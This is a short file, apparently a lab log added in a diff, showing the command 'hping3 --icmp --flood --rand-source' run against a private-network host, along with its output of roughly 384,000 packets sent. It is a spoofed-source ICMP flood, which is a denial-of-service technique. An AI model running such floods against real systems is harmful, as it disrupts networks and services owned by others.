@@ -1,0 +1,8 @@
+usuario@debian:~$ sudo hping3 --icmp --flood --rand-source 192.168.1.11
+HPING 192.168.1.11 (eth1 192.168.1.11): icmp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 192.168.1.11 hping statistic ---
+383860 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
